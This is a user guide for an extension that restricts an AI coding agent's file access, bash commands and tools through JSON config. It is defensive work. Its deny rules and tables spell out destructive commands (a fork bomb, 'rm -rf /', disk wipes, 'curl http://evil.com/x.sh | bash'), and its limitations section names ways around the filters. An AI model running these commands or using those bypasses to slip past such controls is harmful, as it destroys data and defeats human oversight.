# Restrictions Extension - User Guide

Extension for restricting agent's file access, bash commands, and tool usage.

## Installation

The extension loads automatically when placed at `.pi/extensions/restrictions.ts` (project-level). For global usage, copy it to `~/.pi/agent/extensions/`.

## Configuration

The extension is managed via JSON config files. If no config file exists, the extension is **disabled** - no restrictions are applied.

### Config File Locations

| Location | Scope | Priority |
|----------|-------|----------|
| `~/.pi/agent/restrictions.json` | Global (all projects) | Low |
| `<project>/.pi/restrictions.json` | Project | High |

When both files exist, they are merged. Project config overrides global config.

### Minimal Config

The minimum required to activate restrictions:

```json
{
  "enabled": true
}
```

This alone does not block anything. Add rules from the sections below as needed.

---

## Config Reference

### Full Structure

```json
{
  "enabled": true,

  "filesystem": {
    "allowedPaths": ["."],
    "deniedPaths": ["~/.ssh", "~/.aws"],
    "deniedPatterns": ["**/.env", "**/*.pem"],
    "readOnly": false
  },

  "bash": {
    "deniedPatterns": ["sudo\\s+", "rm\\s+(-rf|--recursive)\\s+/"],
    "deniedCommands": [":(){ :|:& };:"],
    "requireConfirmation": ["git push --force", "npm publish"],
    "timeout": 0
  },

  "tools": {
    "disabled": [],
    "readOnlyMode": false
  },

  "ui": {
    "showNotifications": true
  }
}
```

---

### `enabled`

| Value | Behavior |
|-------|----------|
| `true` | Restrictions active |
| `false` | Extension loaded but all restrictions disabled |

---

### `filesystem` - Filesystem Restrictions

Controls which files the agent can access via `read`, `write`, `edit`, `search` tools.

#### `allowedPaths`

Directories the agent is allowed to access. Everything outside these is blocked.

```json
{
  "filesystem": {
    "allowedPaths": [".", "/tmp"]
  }
}
```

- `.` → project directory (cwd) and below
- Multiple directories can be specified
- `~` expands to home directory (`~/projects` → `/Users/you/projects`)
- If left empty (`[]`), no path checking is performed

#### `deniedPaths`

Directories/files with access unconditionally blocked. Checked **before** `allowedPaths`.

```json
{
  "filesystem": {
    "deniedPaths": [
      "~/.ssh",
      "~/.aws",
      "~/.gnupg",
      "~/.config",
      "/etc",
      "/usr",
      "/System"
    ]
  }
}
```

If a path is in `deniedPaths`, it is blocked even if it is also in `allowedPaths`.

#### `deniedPatterns`

Files matching glob patterns are blocked.

```json
{
  "filesystem": {
    "deniedPatterns": [
      "**/.env",
      "**/.env.*",
      "**/*.pem",
      "**/*.key",
      "**/node_modules/**",
      "**/.git/objects/**"
    ]
  }
}
```

Supported glob syntax:

| Pattern | Meaning |
|---------|---------|
| `**` | Any directory depth |
| `*` | Any characters within a single directory |
| `?` | A single character |

#### `readOnly`

When set to `true`, all `write` and `edit` tool calls are blocked. Bash is also blocked.

```json
{
  "filesystem": {
    "readOnly": true
  }
}
```

#### Evaluation Order

Paths are checked in the following order:

1. **deniedPaths** → If matched: block
2. **deniedPatterns** → If matched: block
3. **allowedPaths** → If not matched: block
4. If none triggered: allow

---

### `bash` - Bash Command Restrictions

Controls which commands the agent can execute via the `bash` tool.

#### `deniedPatterns`

Regex patterns. Matching commands are automatically blocked. Case-insensitive.

```json
{
  "bash": {
    "deniedPatterns": [
      "rm\\s+(-rf?|--recursive)\\s+/$",
      "rm\\s+(-rf?|--recursive)\\s+~/?$",
      "sudo\\s+",
      "mkfs\\b",
      ":(\\(\\)\\{\\s*:\\|:\\&\\s*\\};:)",
      "\\|\\s*(sh|bash)\\s*$",
      "curl\\b.*\\|.*\\b(sh|bash)\\b",
      "wget\\b.*\\|.*\\b(sh|bash)\\b",
      ">\\s*/dev/sd[a-z]"
    ]
  }
}
```

What these patterns catch:

| Pattern | Caught Commands |
|---------|-----------------|
| `rm\s+(-rf?\|--recursive)\s+/$` | `rm -rf /`, `rm -r /` |
| `sudo\s+` | `sudo apt-get install`, `sudo rm ...` |
| `mkfs\b` | `mkfs.ext4 /dev/sda1` |
| `\|\s*(sh\|bash)\s*$` | `echo "cmd" \| sh` |
| `curl\b.*\|.*\b(sh\|bash)\b` | `curl http://evil.com/x.sh \| bash` |
| `>\s*/dev/sd[a-z]` | `> /dev/sda` (disk wipe) |

#### `deniedCommands`

Literal substring matching. If the command **contains** this string, it is blocked.

```json
{
  "bash": {
    "deniedCommands": [
      ":(){ :|:& };:",
      "format c:",
      "/dev/null"
    ]
  }
}
```

#### `requireConfirmation`

Literal substring matching. If the command contains this string, user confirmation is requested. If denied, the command is blocked.

```json
{
  "bash": {
    "requireConfirmation": [
      "git push --force",
      "git push -f",
      "git reset --hard",
      "npm publish",
      "docker rm",
      "docker rmi"
    ]
  }
}
```

The confirmation dialog appears in the TUI as follows:

```
┌─ Confirmation Required ──────────────────────────┐
│                                                   │
│ This command matches a restricted pattern:         │
│                                                   │
│   git push --force origin main                    │
│                                                   │
│ Matched rule: "git push --force"                  │
│                                                   │
│ Allow execution?                                  │
│                                                   │
│              [Yes]    [No]                        │
└───────────────────────────────────────────────────┘
```

> **Note:** In non-UI modes (print mode `-p`), commands requiring confirmation are automatically blocked.

#### `timeout`

Maximum duration for bash commands in seconds. `0` = no limit. This value is informational only; the current implementation uses the bash tool's own timeout mechanism.

---

### `tools` - Tool Restrictions

#### `disabled`

Tools to disable entirely.

```json
{
  "tools": {
    "disabled": ["bash", "write"]
  }
}
```

Available tool names: `read`, `write`, `edit`, `bash`, `search`

#### `readOnlyMode`

When set to `true`, `write`, `edit`, and `bash` tools are blocked. `read` and `search` continue to work.

```json
{
  "tools": {
    "readOnlyMode": true
  }
}
```

---

### `ui` - Notification Settings

#### `showNotifications`

Whether to show a TUI notification when a tool is blocked.

```json
{
  "ui": {
    "showNotifications": true
  }
}
```

When set to `false`, blocking happens silently. The agent still receives an error message, but no notification is shown to the user.

---

## Usage

### Starting

The extension loads automatically when placed under `.pi/extensions/`:

```bash
pi
```

Or manually:

```bash
pi -e .pi/extensions/restrictions.ts
```

### Disabling

To temporarily disable without deleting the config file:

```bash
pi --no-restrictions
```

Or in the config:

```json
{
  "enabled": false
}
```

### Viewing Current Rules

Inside pi:

```
/restrictions
```

### Changing Config

Edit the `.pi/restrictions.json` file, then run `/reload` inside pi. No restart needed.

---

## Restriction Layers

The extension applies a 4-layer defense system. Each tool call passes through these layers in order:

```
Tool Call
  │
  ├─ 1. Tool disabled?               → Block if in disabled list
  │
  ├─ 2. Read-only mode active?       → Block if write/edit/bash
  │
  ├─ 3. Path restricted?             → Check deniedPaths/deniedPatterns/allowedPaths
  │
  └─ 4. Bash command restricted?     → Check deniedPatterns/deniedCommands/requireConfirmation
```

The first matching layer blocks the tool. Subsequent layers are not checked.

---

## Example Configs

### Minimum Security

```json
{
  "enabled": true,
  "filesystem": {
    "deniedPaths": ["~/.ssh", "~/.aws"]
  },
  "bash": {
    "deniedPatterns": ["sudo\\s+", "rm\\s+(-rf|--recursive)\\s+/"]
  }
}
```

### Strict Sandbox

```json
{
  "enabled": true,
  "filesystem": {
    "allowedPaths": [".", "/tmp"],
    "deniedPaths": ["~/.ssh", "~/.aws", "~/.gnupg", "~/.config", "/etc", "/usr"],
    "deniedPatterns": ["**/.env", "**/.env.*", "**/*.pem", "**/*.key", "**/node_modules/**"]
  },
  "bash": {
    "deniedPatterns": [
      "rm\\s+(-rf?|--recursive)\\s+/$",
      "sudo\\s+",
      "mkfs\\b",
      "curl\\b.*\\|.*\\b(sh|bash)\\b",
      "wget\\b.*\\|.*\\b(sh|bash)\\b"
    ],
    "deniedCommands": [":(){ :|:& };:"],
    "requireConfirmation": [
      "git push --force",
      "git push -f",
      "git reset --hard",
      "npm publish"
    ]
  }
}
```

### Read-Only (Code Review)

```json
{
  "enabled": true,
  "tools": {
    "readOnlyMode": true
  }
}
```

### Disable Specific Tools

```json
{
  "enabled": true,
  "tools": {
    "disabled": ["bash", "write"]
  }
}
```

---

## Limitations

- **Bash commands are not 100% secure.** Restrictions can be bypassed via techniques like variable expansion (`$HOME/.ssh`), subshells (`$(cat /etc/passwd)`), and base64 encoding. Regex-based pattern matching catches common dangerous commands but cannot cover every case.
- **Only controls pi tools.** Messages sent to the LLM and extension tools are also in scope, but this is not an OS-level sandbox.
- Path checking applies to the `path` parameter of `read`, `write`, `edit`, `search` tools. Paths inside bash commands are not checked by this mechanism (only caught by regex patterns).

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Extension not loading | Verify the file is at `.pi/extensions/restrictions.ts` |
| Config changes not applying | Run `/reload` inside pi |
| Unexpected blocking | Check current rules with `/restrictions` |
| No notifications visible | Ensure `ui.showNotifications` is `true` |
| Temporarily disable all restrictions | Start with `pi --no-restrictions` |
